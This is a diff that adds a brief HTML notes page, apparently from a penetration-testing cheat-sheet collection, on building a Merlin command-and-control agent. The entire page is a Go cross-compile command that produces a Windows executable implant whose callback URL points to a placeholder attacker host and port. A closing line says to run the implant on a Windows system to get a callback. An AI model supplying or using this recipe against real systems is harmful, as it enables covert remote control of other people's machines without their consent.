@@ -1,0 +1,11 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Making A Merlin Agent</title>
+</head><body>This is just one example<br/>
+<br/>
+cd merlinagent<br/>
+GOOS=windows GOARCH=amd64 go build -ldflags *-X main.url=https://&lt;LHOST&gt;:&lt;LPORT&gt; -o agent.exe main.go<br/>
+<br/>
+And now just execute it on a windows system for your callback</body></html>
